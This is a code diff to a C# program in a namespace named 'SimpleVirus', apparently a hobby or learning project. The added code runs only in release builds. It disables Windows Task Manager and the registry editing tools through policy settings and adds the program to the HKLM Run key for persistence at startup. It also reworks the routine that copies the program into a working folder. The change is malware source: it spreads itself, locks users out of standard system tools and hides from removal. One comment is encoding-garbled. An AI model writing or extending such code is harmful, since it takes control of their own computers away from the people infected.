@@ -33,9 +33,11 @@ namespace SimpleVirus
             if (Application.StartupPath != workDir)
             {
                 SelfReplication(workDir);
-
-                SetPoliciesSetting(PoliciesSetting.TaskManager, true);
-                SetPoliciesSetting(PoliciesSetting.RegistryTools, true);
+#if !DEBUG
+                SetPoliciesSetting(PoliciesSetting.TaskManager, false);
+                SetPoliciesSetting(PoliciesSetting.RegistryTools, false);
+                SetStartUp(ApplicationName, Path.Combine(workDir, ApplicationName + ".exe"), true);
+#endif
             }
         }
 
@@ -67,7 +69,11 @@ namespace SimpleVirus
             }
             else
             {
-                CopyDirectory(Application.StartupPath, destinationDir, true);
+                if (Directory.Exists(destinationDir))
+                {
+                    Directory.Delete(destinationDir, true);
+                    CopyDirectory(Application.StartupPath, destinationDir, true);
+                }
             }
         }
 
@@ -120,6 +126,21 @@ namespace SimpleVirus
                 objRegistryKey.DeleteValue(keyValue); // ≈∞ ªË¡¶ 
             else if (!enable)
                 objRegistryKey.SetValue(keyValue, 1, RegistryValueKind.DWord);
+
+            objRegistryKey.Close();
+        }
+
+        private static void SetStartUp(string programName, string programPath, bool enable)
+        {
+            const string registryKeyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+            string keyValue = programName;
+            
+            RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(registryKeyPath);
+
+            if (enable && objRegistryKey.GetValue(keyValue) == null)
+                objRegistryKey.SetValue(keyValue, programPath);
+            else if (!enable)
+                objRegistryKey.DeleteValue(keyValue);
 
             objRegistryKey.Close();
         }
